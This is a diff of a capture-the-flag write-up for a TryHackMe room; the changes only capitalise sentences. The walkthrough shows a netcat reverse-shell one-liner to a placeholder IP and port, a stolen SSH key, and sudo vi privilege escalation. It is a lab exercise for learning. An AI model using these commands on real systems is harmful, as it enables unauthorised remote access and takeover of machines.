@@ -20,7 +20,7 @@ Let’s get started. Firstly Deploy the machine and wait a minute for getting th
      -sC: equivalent to --script=default 
      -v: verbose mode 
      
-the result looks like,<br />
+The result looks like,<br />
 
   
   ![reverseconnection]({{site.baseurl}}/assets/img/cholocate.tryhackme/init1.png)
@@ -36,7 +36,7 @@ I trying SQL injection but nothing changes, So Check the directories using the g
   
 OK.. Here see home.php <br />
  ![nmap]({{site.baseurl}}/assets/img/cholocate.tryhackme/command.ls.png)  
-  try system commands then reverse connection command 
+  Try system commands then reverse connection command 
   
      'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f'
  
@@ -50,11 +50,11 @@ OK.. Here see home.php <br />
     
    ![reverseconnection]({{site.baseurl}}/assets/img/cholocate.tryhackme/reverse2.png) 
    
-   use python3 shell for better interaction <br />
+   Use python3 shell for better interaction <br />
       
       python3 -c 'import pty; pty.spawn("/bin/sh")' 
       
-   then list out the file and read the file..
+   Then list out the file and read the file..
    
    ![reverseconnection]({{site.baseurl}}/assets/img/cholocate.tryhackme/cat.key.png)
   
@@ -62,42 +62,42 @@ OK.. Here see home.php <br />
    
    ![reverseconnection]({{site.baseurl}}/assets/img/cholocate.tryhackme/validateuser.png)
    
-   change the user to charlie <br/>
+   Change the user to charlie <br/>
    /home/charlie and list all files <br />
-   found RSA key in this folder called teleport and I copied it to my machine and saved that under the name id_rsa.change the permission.
+   Found RSA key in this folder called teleport and I copied it to my machine and saved that under the name id_rsa.change the permission.
    
    ![reverseconnection]({{site.baseurl}}/assets/img/cholocate.tryhackme/id_rsa.png) <br />
    
     chmod 600 filename 
     
-   login with ssh charlie user
+   Login with ssh charlie user
     
   ![reverseconnection]({{site.baseurl}}/assets/img/cholocate.tryhackme/sshcharlie.png) <br />
-  read the user key <br />
+  Read the user key <br />
   ![reverseconnection]({{site.baseurl}}/assets/img/cholocate.tryhackme/userflag.png) 
    
  ## Privilege Escalation
  <br />
-  check the current user privilege 
+  Check the current user privilege 
    
      sudo -l 
     
  <br/>
  ![reverseconnection]({{site.baseurl}}/assets/img/cholocate.tryhackme/userprivilege.png) <br />
-   get root permission using vi <br />
-   use this website [GTFOBINS](http://gtfobins.github.io/) <br />
-   search vi get result 
+   Get root permission using vi.<br />
+   Use this website [GTFOBINS](http://gtfobins.github.io/) <br />
+   Search vi get result 
    
    ![reverseconnection]({{site.baseurl}}/assets/img/cholocate.tryhackme/gtbl.png) <br />
    ![reverseconnection]({{site.baseurl}}/assets/img/cholocate.tryhackme/root.png) <br />
-   copy the command and paste into the terminal and hit enter <br />
+   Copy the command and paste into the terminal and hit enter <br />
    Now root user <br >
-   change charlie to root <br />
+   Change charlie to root <br />
    
     su root
    
    
-   list the files and run python file, enter the key 
+   List the files and run python file, enter the key 
    ![success]({{site.baseurl}}/assets/img/cholocate.tryhackme/root3.png) <br />
    DONE !!!
   
